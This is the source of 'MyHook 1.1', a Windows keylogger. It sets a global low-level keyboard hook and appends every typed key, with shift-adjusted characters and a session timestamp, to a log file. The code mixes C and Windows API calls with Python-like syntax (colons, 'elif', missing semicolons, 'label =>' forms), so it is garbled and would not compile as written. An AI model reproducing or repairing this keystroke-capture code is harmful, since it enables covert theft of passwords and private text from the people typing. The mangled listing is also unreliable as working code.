/*
    MyHook 1.1
    Origional Code and Concept Copyright 2008 Daniel Amodio (deige101)
    Created for Major League Coding
    http://groups.myspace.com/MajorLeagueCoding

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <time.h>
#include <windows.h>

FILE *file = stdout


int main(int argc, char const *argv[]):
    if argc > 1:
        file = fopen(argv[1], "a+")
        if file == NULL:
            file = stdout
    print_splash()
    create_hook()
    return 0


LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam):
    // Record when the key has been pressed and released
    KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam
    if wParam != WM_KEYUP:
        return CallNextHookEx(NULL, nCode, wParam, lParam)

    // Determine which key has been pressed,
    // and check whether shift key is down (fairly accurate)
    DWORD vkCode = pKeyBoard->vkCode, vkShift = GetAsyncKeyState(VK_SHIFT)

    // Number keys
    if '0' <= vkCode && vkCode <= '9':
        if vkShift:
            vkCode = ")!@#$%^&*("[vkCode - '0']
    elif VK_NUMPAD0 <= vkCode && vkCode <= VK_NUMPAD9:
        vkCode -= VK_NUMPAD0

    // Alphabetic keys
    elif 'A' <= vkCode && vkCode <= 'Z':
        if !vkShift:
            vkCode += 'a' - 'A'

    // Other keys
    else:
        goto others

    alphanumeric => fputc(vkCode, file)
    return 0

    others => switch:
        vkCode
    case VK_RETURN:
        fputs("[Enter]\n", file)
    case VK_DELETE:
        fputs("[Delete]", file)
    case VK_INSERT:
        fputs("[Insert]", file)
    case VK_LCONTROL, VK_RCONTROL:
        fputs("[Ctrl]", file)
    case VK_LSHIFT, VK_RSHIFT:
        fputs("[Shift]", file)
    case VK_LMENU, VK_RMENU:
        fputs("[Alt]", file)
    case VK_OEM_1:
        fputc(vkShift? ':': ';', file)
    case VK_OEM_2:
        fputc(vkShift? '?': '/', file)
    case VK_OEM_3:
        fputc(vkShift? '~': '`', file)
    case VK_OEM_4:
        fputc(vkShift? '{': '[', file)
    case VK_OEM_5:
        fputc(vkShift? '|': '\\', file)
    case VK_OEM_6:
        fputc(vkShift? '}': ']', file)
    case VK_OEM_7:
        fputc(vkShift? '"': '\'', file)
    case VK_OEM_PLUS:
        fputc(vkShift? '+': '=', file)
    case VK_OEM_COMMA:
        fputc(vkShift? '<': ',', file)
    case VK_OEM_MINUS:
        fputc(vkShift? '_': '-', file)
    case VK_OEM_PERIOD:
        fputc(vkShift? '>': '.', file)
    default:
        // Use GetNameText instead of a lot of switch statements
        // to catch all miscellaneous keys
        DWORD dwMsg = 1
        dwMsg += pKeyBoard->scanCode << 16
        dwMsg += pKeyBoard->flags << 24
        char key[16]
        GetKeyNameText(dwMsg, key, 15)
        fprintf(file, "[%s]", key)
    return 0


void print_splash(void):
    for int i = 0; i < 72; i++:
        fputc('-', file)

    // Add current timestamp to log
    time_t ltime = time(NULL)
    fprintf(file, "\t\t\tMyHook Session\t%s", asctime(localtime(&ltime)))

    for int i = 0; i < 72; i++:
        fputc('-', file)
    fputc('\n', file)


void create_hook(void):
    // Retrieve the applications instance
    HINSTANCE app_instance = GetModuleHandle(NULL)

    // Set a global hook to capture keystrokes
    SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, app_instance, 0)

    MSG msg
    while GetMessage(&msg, NULL, 0, 0) > 0:
        TranslateMessage(&msg)
        DispatchMessage(&msg)
